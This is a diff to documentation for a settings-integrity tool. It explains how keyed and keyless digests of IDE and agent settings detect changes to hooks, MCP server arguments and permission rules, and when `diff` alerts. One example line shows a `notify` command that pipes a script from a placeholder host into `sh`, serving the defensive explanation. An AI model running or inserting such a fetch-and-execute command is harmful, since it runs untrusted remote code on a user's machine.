@@ -440,7 +440,9 @@ credential helper command. The cost is that
 without the key a change to such a value alone, such as a new helper command, or a
 new token or URL path on the same host in a `notify` command such as
 `TOKEN=x curl https://cdn.example/a.sh | sh`, leaves the record unchanged; the record
-then carries a low `completeness` finding that names the key. Reordered keys and
+then carries a low `completeness` finding that names the key, and `diff` raises a
+medium alert that its values are unbound on every comparison, changed or not, so a
+keyless `diff --fail-on-alert` fails. Reordered keys and
 whitespace change no digest. With the key, `static_value_binding` is an HMAC-SHA256
 under the key over every file as read
 (profile `nexus-symbiote/ide-settings-values/v1`), so the record still changes with
@@ -450,8 +452,11 @@ a header, a permission rule or the maps and keys named above, such as a password
 stored under another key name or a `cwd` path, can still be confirmed from the
 digest, so keep credentials out of settings files. Without the key, a change only to a
 command's arguments, such as a new pinned version in an MCP server's `args`, a new
-option of a hook or `Bash(npm test)` becoming `Bash(npm publish)`, raises no alert; a
-new program, host, operator, hook, rule, tool or header name does. The digests agree between a keyed and an unkeyed
+option of a hook or `Bash(npm test)` becoming `Bash(npm publish)`, alters no digest, so
+`diff` cannot name it; the record instead raises the medium unbound-values alert on
+every comparison, so a keyless `--fail-on-alert` fails. A new program, host, operator,
+hook, rule, tool or header name still changes a recorded digest, so
+`diff` reports the change. The digests agree between a keyed and an unkeyed
 collection, except that without the key a file holding an ambiguous URL authority is
 a failure instead of a digest, so enabling the key later changes no recorded digest;
 the binding itself appears only with the key. A record from an earlier build has no
